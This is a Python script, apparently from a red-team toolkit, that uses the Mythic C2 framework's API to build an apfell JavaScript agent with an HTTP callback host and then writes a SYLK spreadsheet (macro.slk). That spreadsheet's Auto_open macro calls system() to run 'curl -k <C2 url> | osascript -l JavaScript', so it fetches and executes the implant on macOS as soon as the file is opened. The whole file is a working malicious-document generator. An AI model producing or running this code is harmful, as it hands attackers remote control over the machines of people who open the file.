# Adapted from https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

import shutil, errno, os
from mythic import *
import subprocess
import sys
from pathlib import Path
from Settings.MythicSettings import *


def sylk_macros_excel():
    payload = "./Payloads/MacroSYLKExcel_Payload"
    #url = mythic_payload_url + "/Excel_SYLK_Macro.js"   # Used for where the JXA paylaod is hosted
   
    #os.mkdir(payload,0o775)
    Path(payload).mkdir(parents=True, exist_ok=True)
    ## Create apfell payload
    async def scripting():
        # sample login
        mythic = Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = Payload(
            # what payload type is it
            payload_type="apfell", 
            # define non-default c2 profile variables
            c2_profiles={
                "HTTP":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            # give our payload a description if we want
            tag="SYLK Excel Macro",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            # what do we want the payload to be called
            filename="Excel_SYLK_Macro.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        payloadDownloadid = resp.response.file_id.agent_file_id #.response.id

        payload_contents = await mythic.download_payload(resp.response)
        pkg_payload = payload + "/Excel_SYLK_Macro.js"
        with open(pkg_payload, "wb") as f:
            f.write(payload_contents) 

        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location
        
        macrofile = open(payload + '/macro.slk', 'w')
        macrofile.write('ID;P\n')
        macrofile.write('O;E\n')
        macrofile.write('NN;NAuto_open;ER101C1;KD00mFist;F')
        macrofile.write("\n")
        macrofile.write('C;X1;Y101;K0;ECALL(\"libc.dylib\",\"system\",\"JC\",\"/usr/bin/curl -k %s | osascript -l JavaScript &\")'%url)
        macrofile.write("\n")
        macrofile.write("C;X1;Y102;K0;EHALT()")
        macrofile.write("\n")
        macrofile.write("E")

        print("Created the SYLK macro file macro.slk")
 



    async def main():
        await scripting()
        try:
            while True:
                pending = asyncio.Task.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = asyncio.Task.all_tasks()
            for t in pending:
                t.cancel()    

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
